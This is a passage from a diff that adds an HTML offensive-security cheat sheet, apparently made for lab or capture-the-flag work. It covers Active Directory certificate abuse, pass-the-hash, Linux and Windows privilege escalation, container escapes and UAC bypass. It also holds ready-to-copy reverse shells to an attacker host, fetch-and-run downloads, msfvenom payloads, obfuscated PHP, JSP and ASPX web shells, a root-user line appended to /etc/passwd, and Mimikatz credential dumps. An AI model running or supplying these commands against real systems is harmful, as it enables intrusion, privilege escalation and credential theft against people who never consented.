+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> <span class="c-flag">--ntds</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 10: AD CS ATTACKS
+══════════════════════════════════════════════ -->
+<section id="ad-adcs" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-yellow">▤</div>
+    <div class="section-title">Active Directory Certificate Services (AD CS)</div>
+    <div class="section-meta">AD ATTACK</div>
+  </div>
+
+  <div class="alert alert-tip">
+    <span class="alert-icon">💡</span>
+    <div class="alert-body">
+      <div class="alert-title">Tool: certipy</div>
+      <code>pip install certipy-ad</code> — The go-to tool for AD CS attacks
+    </div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🔍 ESC1 — ENROLLEE_SUPPLIES_SUBJECT <span class="card-tag tag-critical">CRITICAL</span></div>
+      <p>Template allows requestor to specify any SAN/UPN → request cert as any user including admin.</p>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Find vulnerable templates</span>
+<span class="c-cmd">certipy find</span> <span class="c-flag">-u</span> user@domain.htb <span class="c-flag">-p</span> pass <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-stdout</span>
+<span class="c-cmd">certipy find</span> <span class="c-flag">-u</span> user@domain.htb <span class="c-flag">-p</span> pass <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-vulnerable</span>
+
+<span class="c-comment"># Request cert as administrator</span>
+<span class="c-cmd">certipy req</span> <span class="c-flag">-u</span> user@domain.htb <span class="c-flag">-p</span> pass <span class="c-flag">-ca</span> <span class="c-var">CA-NAME</span> <span class="c-flag">-template</span> <span class="c-var">VulnTemplate</span> <span class="c-flag">-upn</span> administrator@domain.htb <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># PKINIT → NT hash</span>
+<span class="c-cmd">certipy auth</span> <span class="c-flag">-pfx</span> administrator.pfx <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-domain</span> domain.htb</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🌳 Dangling Template (Custom ESC1)</div>
+      <p>CA trusts template names that don't exist as AD objects → create the template with ESC1 flags.</p>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PYTHON</span><span class="code-desc">ldap3 approach</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Prerequisites: CreateChild on Templates container</span>
+import ldap3, ssl
+
+tls = ldap3.Tls(validate=ssl.CERT_NONE)
+server = ldap3.Server(<span class="c-var">DC_IP</span>, port=636, use_ssl=True, tls=tls)
+conn = ldap3.Connection(server, user=<span class="c-string">'domain\\user'</span>, password=<span class="c-var">PASS</span>, authentication=ldap3.NTLM, auto_bind=True)
+
+<span class="c-comment"># Get OID prefix from existing template first!</span>
+conn.search(TEMPLATES_DN, <span class="c-string">'(cn=User)'</span>, attributes=[<span class="c-string">'msPKI-Cert-Template-OID'</span>,<span class="c-string">'pKIKeyUsage'</span>,<span class="c-string">'pKIExpirationPeriod'</span>,<span class="c-string">'pKIOverlapPeriod'</span>])
+src = conn.entries[0]
+
+attrs = {
+    <span class="c-string">'objectClass'</span>: [<span class="c-string">'top'</span>, <span class="c-string">'pKICertificateTemplate'</span>],
+    <span class="c-string">'cn'</span>: <span class="c-string">'TemplateName'</span>,        <span class="c-comment"># Must match CA whitelist</span>
+    <span class="c-string">'msPKI-Cert-Template-OID'</span>: FOREST_OID + <span class="c-string">'.1.99'</span>,
+    <span class="c-string">'msPKI-Certificate-Name-Flag'</span>: 1,  <span class="c-comment"># ENROLLEE_SUPPLIES_SUBJECT</span>
+    <span class="c-string">'msPKI-Enrollment-Flag'</span>: 0,
+    <span class="c-string">'msPKI-RA-Signature'</span>: 0,
+    <span class="c-string">'pKIExtendedKeyUsage'</span>: [<span class="c-string">'1.3.6.1.5.5.7.3.2'</span>],
+    <span class="c-string">'pKIKeyUsage'</span>: <span class="c-var">src[<span class="c-string">'pKIKeyUsage'</span>].raw_values[0]</span>,  <span class="c-comment"># CRITICAL!</span>
+    <span class="c-string">'pKIExpirationPeriod'</span>: <span class="c-var">src[<span class="c-string">'pKIExpirationPeriod'</span>].raw_values[0]</span>,
+    <span class="c-string">'pKIOverlapPeriod'</span>: <span class="c-var">src[<span class="c-string">'pKIOverlapPeriod'</span>].raw_values[0]</span>,
+    <span class="c-string">'pKIDefaultKeySpec'</span>: 1,
+    <span class="c-string">'msPKI-Minimal-Key-Size'</span>: 2048,
+    <span class="c-string">'revision'</span>: 3, <span class="c-string">'flags'</span>: 66106,
+}
+conn.add(NEW_TEMPLATE_DN, attributes=attrs)</pre>
+      </div>
+      <div class="alert alert-danger" style="margin-top:10px;">
+        <span class="alert-icon">🚨</span>
+        <div class="alert-body">
+          <div class="alert-title">Critical: pKIKeyUsage must be set!</div>
+          Copy raw bytes from existing template. Missing this = CA rejects template every time.
+        </div>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔐 ESC8 — NTLM Relay to ADCS HTTP</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Setup relay</span>
+<span class="c-cmd">ntlmrelayx.py</span> <span class="c-flag">-t</span> http://<span class="c-var">CA_IP</span>/certsrv/certfnsh.asp <span class="c-flag">-smb2support</span> <span class="c-flag">--adcs</span> <span class="c-flag">--template</span> Machine
+
+<span class="c-comment"># Force auth</span>
+<span class="c-cmd">printerbug.py</span> domain/<span class="c-var">user</span>:<span class="c-var">pass</span>@<span class="c-var">$DC</span> <span class="c-var">$LHOST</span>
+<span class="c-cmd">PetitPotam.py</span> <span class="c-var">$LHOST</span> <span class="c-var">$DC</span>
+
+<span class="c-comment"># Auth → cert → PKINIT</span>
+<span class="c-cmd">certipy auth</span> <span class="c-flag">-pfx</span> DC.pfx <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span></pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">📋 AD CS ESC Cheatsheet</div>
+      <div class="table-wrap">
+        <table>
+          <tr><th>ESC</th><th>Description</th><th>Requires</th></tr>
+          <tr><td>ESC1</td><td>ENROLLEE_SUPPLIES_SUBJECT</td><td>Enroll rights</td></tr>
+          <tr><td>ESC2</td><td>Any Purpose EKU</td><td>Enroll rights</td></tr>
+          <tr><td>ESC3</td><td>Certificate Request Agent</td><td>Enroll rights</td></tr>
+          <tr><td>ESC4</td><td>Vulnerable template ACL</td><td>Write on template</td></tr>
+          <tr><td>ESC6</td><td>EDITF_ATTRIBUTESUBJECTALTNAME2</td><td>Enroll rights</td></tr>
+          <tr><td>ESC7</td><td>Vulnerable CA ACL</td><td>Manage CA</td></tr>
+          <tr><td>ESC8</td><td>NTLM relay to AD CS HTTP</td><td>Network position</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 11: LATERAL MOVEMENT
+══════════════════════════════════════════════ -->
+<section id="ad-lateral" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-orange">▤</div>
+    <div class="section-title">Lateral Movement</div>
+    <div class="section-meta">AD ATTACK</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🔑 Pass-the-Hash (PtH) <span class="card-tag tag-critical">CRITICAL</span></div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># psexec</span>
+<span class="c-cmd">psexec.py</span> <span class="c-flag">-hashes</span> <span class="c-var">LM:NT</span> domain/<span class="c-var">user</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># wmiexec</span>
+<span class="c-cmd">wmiexec.py</span> <span class="c-flag">-hashes</span> <span class="c-var">LM:NT</span> domain/<span class="c-var">user</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># smbexec</span>
+<span class="c-cmd">smbexec.py</span> <span class="c-flag">-hashes</span> <span class="c-var">LM:NT</span> domain/<span class="c-var">user</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># evil-winrm</span>
+<span class="c-cmd">evil-winrm</span> <span class="c-flag">-i</span> <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-H</span> <span class="c-var">NTHASH</span>
+
+<span class="c-comment"># crackmapexec exec</span>
+<span class="c-cmd">crackmapexec</span> smb <span class="c-var">$IP</span> <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-H</span> <span class="c-var">NTHASH</span> <span class="c-flag">-x</span> <span class="c-string">"whoami"</span></pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔄 ACL Abuse — ForceChangePassword / GenericAll</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># ForceChangePassword</span>
+<span class="c-cmd">changepasswd.py</span> domain/<span class="c-var">attacker</span>:<span class="c-var">pass</span>@<span class="c-var">$IP</span> <span class="c-flag">-newpass</span> NewPass123! <span class="c-flag">-altuser</span> domain/<span class="c-var">target</span>
+
+<span class="c-cmd">bloodyAD</span> <span class="c-flag">--host</span> <span class="c-var">$IP</span> <span class="c-flag">-d</span> domain.htb <span class="c-flag">-u</span> <span class="c-var">attacker</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> set password <span class="c-var">target</span> NewPass123!
+
+<span class="c-comment"># GenericAll on group → add user</span>
+<span class="c-cmd">bloodyAD</span> <span class="c-flag">--host</span> <span class="c-var">$IP</span> <span class="c-flag">-d</span> domain.htb <span class="c-flag">-u</span> <span class="c-var">user</span> <span class="c-flag">-p</span> <span class="c-var">pass</span> add groupMember <span class="c-string">"Domain Admins"</span> <span class="c-var">user</span>
+
+<span class="c-comment"># GenericWrite → set SPN for Kerberoasting</span>
+Set-ADUser <span class="c-var">target</span> <span class="c-flag">-ServicePrincipalNames</span> @{Add=<span class="c-string">'fake/spn'</span>}
+<span class="c-cmd">GetUserSPNs.py</span> domain/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span> <span class="c-flag">-request</span></pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🎭 DPAPI — Credential Decryption</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Offline decrypt masterkey</span>
+<span class="c-cmd">impacket-dpapi masterkey</span> <span class="c-flag">-file</span> /path/to/masterkey <span class="c-flag">-sid</span> <span class="c-var">S-1-5-21-XXX</span> <span class="c-flag">-password</span> <span class="c-string">'userpass'</span>
+
+<span class="c-comment"># Decrypt credential blob</span>
+<span class="c-cmd">impacket-dpapi credential</span> <span class="c-flag">-file</span> /path/to/cred_blob <span class="c-flag">-key</span> <span class="c-var">DERIVED_KEY</span>
+
+<span class="c-comment"># Paths to exfil (via shell)</span>
+<span class="c-comment"># Masterkeys:</span>
+C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\
+
+<span class="c-comment"># Credential blobs:</span>
+C:\Users\user\AppData\Roaming\Microsoft\Credentials\
+
+<span class="c-comment"># Chrome passwords (DPAPI encrypted)</span>
+C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔒 Constrained Delegation Abuse</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Find delegation</span>
+<span class="c-cmd">findDelegation.py</span> domain/<span class="c-var">user</span>:<span class="c-var">pass</span> <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
+
+<span class="c-comment"># S4U2Self + S4U2Proxy → get TGS as administrator</span>
+<span class="c-cmd">getST.py</span> domain/<span class="c-var">svc_account</span>:<span class="c-var">pass</span> <span class="c-flag">-spn</span> cifs/<span class="c-var">DC.domain.htb</span> <span class="c-flag">-impersonate</span> administrator <span class="c-flag">-dc-ip</span> <span class="c-var">$IP</span>
+
+<span class="c-cmd">export</span> KRB5CCNAME=administrator.ccache
+<span class="c-cmd">psexec.py</span> <span class="c-flag">-k</span> <span class="c-flag">-no-pass</span> domain/<span class="c-var">administrator</span>@<span class="c-var">DC.domain.htb</span></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 12: LINUX PRIVESC
+══════════════════════════════════════════════ -->
+<section id="privesc-linux" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-green">▲</div>
+    <div class="section-title">Linux Privilege Escalation</div>
+    <div class="section-meta">PRIVESC</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🐧 Linux PrivEsc Checklist</div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-body"><div class="step-title">SUID/SGID Binaries</div><div class="step-desc"><code>find / -perm -4000 2>/dev/null</code> → check GTFObins</div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-body"><div class="step-title">Sudo privileges</div><div class="step-desc"><code>sudo -l</code> → check GTFObins for allowed commands</div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-body"><div class="step-title">Writable files/cron jobs</div><div class="step-desc"><code>cat /etc/cron* /var/spool/cron/*</code></div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-body"><div class="step-title">Capabilities</div><div class="step-desc"><code>getcap -r / 2>/dev/null</code></div></div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-body"><div class="step-title">Kernel exploits</div><div class="step-desc"><code>uname -a</code> → searchsploit</div></div></div>
+        <div class="step"><div class="step-num">6</div><div class="step-body"><div class="step-title">Password reuse</div><div class="step-desc">Check /etc/passwd, .bash_history, config files</div></div></div>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">⚡ SUID Abuse (GTFObins)</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Find all SUID</span>
+find / <span class="c-flag">-perm -4000</span> 2>/dev/null
+
+<span class="c-comment"># Common SUID exploits (GTFObins)</span>
+<span class="c-comment"># bash</span>
+bash <span class="c-flag">-p</span>
+
+<span class="c-comment"># vim</span>
+vim <span class="c-flag">-c</span> <span class="c-string">':!/bin/bash -p'</span>
+
+<span class="c-comment"># find</span>
+find . <span class="c-flag">-exec</span> /bin/sh <span class="c-flag">-p</span> \; <span class="c-flag">-quit</span>
+
+<span class="c-comment"># python</span>
+python3 <span class="c-flag">-c</span> <span class="c-string">'import os; os.execl("/bin/sh","sh","-p")'</span>
+
+<span class="c-comment"># cp → overwrite /etc/passwd</span>
+openssl passwd <span class="c-flag">-1</span> <span class="c-flag">-salt</span> xyz newpass
+echo <span class="c-string">'root2:HASH:0:0::/root:/bin/bash'</span> >> /etc/passwd</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔧 Sudo Abuse</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># sudo -l shows:</span>
+<span class="c-comment"># (ALL) NOPASSWD: /usr/bin/vim</span>
+sudo vim <span class="c-flag">-c</span> <span class="c-string">':!/bin/bash'</span>
+
+<span class="c-comment"># (ALL) NOPASSWD: /usr/bin/less</span>
+sudo less /etc/passwd
+!/bin/bash
+
+<span class="c-comment"># (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py</span>
+<span class="c-comment"># If script imports writable module:</span>
+echo <span class="c-string">'import os; os.system("/bin/bash")'</span> > /writable/module.py
+
+<span class="c-comment"># (root) NOPASSWD: /usr/bin/perl /home/user/backup.pl</span>
+<span class="c-comment"># /home/user/backup.pl is writable:</span>
+echo <span class="c-string">'exec "/bin/bash -p"'</span> > /home/user/backup.pl
+sudo /usr/bin/perl /home/user/backup.pl</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">⚙️ Capabilities Abuse</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Find capabilities</span>
+getcap <span class="c-flag">-r</span> / 2>/dev/null
+
+<span class="c-comment"># cap_setuid+eip on python</span>
+python3 <span class="c-flag">-c</span> <span class="c-string">'import os; os.setuid(0); os.system("/bin/bash")'</span>
+
+<span class="c-comment"># cap_net_raw on tcpdump</span>
+tcpdump <span class="c-flag">-i</span> lo <span class="c-flag">-w</span> /tmp/capture.pcap  <span class="c-comment"># sniff creds</span>
+
+<span class="c-comment"># cap_dac_read_search on tar</span>
+tar cvf /tmp/shadow /etc/shadow
+
+<span class="c-comment"># Dangerous capabilities</span>
+cap_setuid    → setuid(0) = root
+cap_sys_admin → mount, write to /proc
+cap_dac_override → bypass file permissions
+cap_net_raw   → raw socket access</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">📋 Automated Enumeration</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># linpeas — download & run</span>
+curl <span class="c-flag">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+
+<span class="c-comment"># LinEnum</span>
+./LinEnum.sh <span class="c-flag">-s</span> <span class="c-flag">-k</span> password <span class="c-flag">-r</span> report <span class="c-flag">-e</span> /tmp/exports/ <span class="c-flag">-t</span>
+
+<span class="c-comment"># pspy — monitor processes</span>
+./pspy64 <span class="c-flag">-pf</span> <span class="c-flag">-i</span> 1000
+
+<span class="c-comment"># Host simple server and wget on target</span>
+python3 <span class="c-flag">-m</span> http.server 8888   <span class="c-comment"># your machine</span>
+wget http://<span class="c-var">$LHOST</span>:8888/linpeas.sh</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🐳 Docker / LXC Escape</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Check if in container</span>
+cat /proc/1/cgroup
+ls /.dockerenv
+hostname
+
+<span class="c-comment"># Docker socket escape</span>
+ls /var/run/docker.sock
+docker <span class="c-flag">-H</span> unix:///var/run/docker.sock run <span class="c-flag">-it</span> <span class="c-flag">-v</span> /:/host <span class="c-flag">--rm</span> ubuntu chroot /host /bin/bash
+
+<span class="c-comment"># LXC escape</span>
+lxc image import alpine.tar.gz --alias alpine
+lxc init alpine privesc <span class="c-flag">-c</span> security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/bash
+chroot /mnt/root /bin/bash</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 13: WINDOWS PRIVESC
+══════════════════════════════════════════════ -->
+<section id="privesc-windows" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-cyan">▲</div>
+    <div class="section-title">Windows Privilege Escalation</div>
+    <div class="section-meta">PRIVESC</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🪟 Windows PrivEsc Checklist</div>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-body"><div class="step-title">SeImpersonatePrivilege</div><div class="step-desc">JuicyPotato, PrintSpoofer, GodPotato</div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-body"><div class="step-title">Unquoted service path</div><div class="step-desc"><code>wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"</code></div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-body"><div class="step-title">Writable service binary</div><div class="step-desc"><code>sc qc ServiceName</code> → check permissions</div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-body"><div class="step-title">AlwaysInstallElevated</div><div class="step-desc"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></div></div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-body"><div class="step-title">Stored credentials</div><div class="step-desc"><code>cmdkey /list</code>, <code>dir C:\Users\*\Desktop\*.txt</code></div></div></div>
+        <div class="step"><div class="step-num">6</div><div class="step-body"><div class="step-title">winPEAS</div><div class="step-desc">Run <code>winPEASx64.exe</code> for full enumeration</div></div></div>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🥔 Potato Attacks (SeImpersonatePrivilege)</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Check privileges</span>
+whoami /priv
+
+<span class="c-comment"># PrintSpoofer (Windows 10 / Server 2016+)</span>
+.\PrintSpoofer64.exe -i -c cmd
+
+<span class="c-comment"># GodPotato (most modern)</span>
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "cmd /c nc.exe $LHOST 4444 -e cmd"
+
+<span class="c-comment"># JuicyPotato (Windows Server 2016 and below)</span>
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe $LHOST 4444 -e cmd" -t *
+
+<span class="c-comment"># RoguePotato</span>
+.\RoguePotato.exe -r $LHOST -e "nc.exe $LHOST 4444 -e cmd.exe" -l 9999</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🔍 Automated Windows Enum</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># winPEAS — download</span>
+iwr http://<span class="c-var">$LHOST</span>:8888/winPEASx64.exe -OutFile C:\Temp\wp.exe
+.\wp.exe
+
+<span class="c-comment"># PowerUp</span>
+iex(iwr http://<span class="c-var">$LHOST</span>:8888/PowerUp.ps1 -UseBasicParsing)
+Invoke-AllChecks
+
+<span class="c-comment"># Seatbelt</span>
+.\Seatbelt.exe -group=all
+
+<span class="c-comment"># Manual quick checks</span>
+whoami /all
+systeminfo | findstr /i "os name"
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+net users
+net localgroup administrators</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🛡️ UAC Bypass</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># fodhelper bypass</span>
+New-Item <span class="c-string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="c-flag">-Force</span>
+Set-ItemProperty <span class="c-string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="c-flag">-Name</span> <span class="c-string">"DelegateExecute"</span> <span class="c-flag">-Value</span> <span class="c-string">""</span>
+Set-ItemProperty <span class="c-string">"HKCU:\Software\Classes\ms-settings\Shell\Open\command"</span> <span class="c-flag">-Name</span> <span class="c-string">"(default)"</span> <span class="c-flag">-Value</span> <span class="c-string">"cmd /c start cmd.exe"</span>
+Start-Process fodhelper.exe
+
+<span class="c-comment"># UACME</span>
+.\UACME.exe 41
+
+<span class="c-comment"># Check UAC level</span>
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 14: SHELLS & PIVOTING
+══════════════════════════════════════════════ -->
+<section id="shells" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-cyan">◎</div>
+    <div class="section-title">Shells & Pivoting</div>
+    <div class="section-meta">POST-EXPLOIT</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🐚 Shell Upgrade (TTY)</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Python pty</span>
+python3 <span class="c-flag">-c</span> <span class="c-string">'import pty;pty.spawn("/bin/bash")'</span>
+python <span class="c-flag">-c</span> <span class="c-string">'import pty;pty.spawn("/bin/bash")'</span>
+
+<span class="c-comment"># After python pty:</span>
+Ctrl+Z
+stty raw <span class="c-flag">-echo</span>; fg
+export TERM=xterm
+stty rows 50 cols 200
+
+<span class="c-comment"># script</span>
+script <span class="c-flag">/dev/null</span> <span class="c-flag">-c</span> bash
+
+<span class="c-comment"># socat</span>
+<span class="c-comment"># Listener:</span>
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+<span class="c-comment"># Target:</span>
+socat exec:<span class="c-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="c-var">$LHOST</span>:4444</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🌉 SSH Tunneling</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Local port forward (access remote:8080 via localhost:8080)</span>
+ssh <span class="c-flag">-L</span> 8080:localhost:8080 <span class="c-var">user</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># Dynamic SOCKS proxy</span>
+ssh <span class="c-flag">-D</span> 1080 <span class="c-var">user</span>@<span class="c-var">$IP</span>
+<span class="c-comment"># Then: proxychains nmap ...</span>
+
+<span class="c-comment"># Remote port forward (expose your local to remote)</span>
+ssh <span class="c-flag">-R</span> 8888:localhost:8888 <span class="c-var">user</span>@<span class="c-var">$IP</span>
+
+<span class="c-comment"># chisel tunneling</span>
+<span class="c-comment"># Server (your machine):</span>
+./chisel server <span class="c-flag">-p</span> 8888 <span class="c-flag">--reverse</span>
+<span class="c-comment"># Client (target):</span>
+./chisel client <span class="c-var">$LHOST</span>:8888 R:socks</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🎯 Meterpreter & Metasploit</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">MSFCONSOLE</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Generate payload</span>
+msfvenom <span class="c-flag">-p</span> linux/x64/meterpreter/reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> elf > shell.elf
+msfvenom <span class="c-flag">-p</span> windows/x64/meterpreter/reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> exe > shell.exe
+
+<span class="c-comment"># Multi/handler</span>
+use multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST <span class="c-var">$IP</span>
+set LPORT 4444
+run
+
+<span class="c-comment"># Meterpreter commands</span>
+getuid; sysinfo; getsystem
+upload /local/file /remote/path
+download /remote/file
+run post/multi/recon/local_exploit_suggester</pre>
+      </div>
+    </div>
+
+    <div class="card searchable">
+      <div class="card-title">🕸️ Web Shell Arsenal</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">PHP</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment">// Minimal PHP shell</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passthru($_GET['cmd']); ?&gt;
+&lt;?php echo shell_exec($_GET['cmd']); ?&gt;
+
+<span class="c-comment">// POST request shell</span>
+&lt;?php if(isset($_POST['c'])){system($_POST['c']);}?&gt;
+curl -d "c=id" http://$IP/shell.php
+
+<span class="c-comment">// PHP obfuscated</span>
+&lt;?php $f='sys'.'tem';$f($_GET[0]);?&gt;
+&lt;?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7'));?&gt;
+
+// JSP
+&lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;
+
+// ASPX
+&lt;%@ Page Language="C#"%&gt;&lt;%=System.Diagnostics.Process.Start(Request["cmd"])%&gt;</pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════
+     SECTION 15: CREDENTIAL DUMPING
+══════════════════════════════════════════════ -->
+<section id="creds" class="section searchable">
+  <div class="section-header">
+    <div class="section-icon icon-orange">◎</div>
+    <div class="section-title">Credential Dumping</div>
+    <div class="section-meta">POST-EXPLOIT</div>
+  </div>
+
+  <div class="grid grid-2">
+    <div class="card searchable">
+      <div class="card-title">🗝️ Windows Credential Dump</div>
+      <div class="code-block">
+        <div class="code-header"><span class="code-lang">CMD/PS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <pre><span class="c-comment"># Mimikatz</span>
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::wdigest
+lsadump::sam
+lsadump::lsa /patch
+lsadump::dcsync /user:administrator
+
+<span class="c-comment"># SAM dump (offline)</span>
+reg save HKLM\SAM C:\Temp\SAM
+reg save HKLM\SYSTEM C:\Temp\SYSTEM
+<span class="c-comment"># Then on Kali:</span>
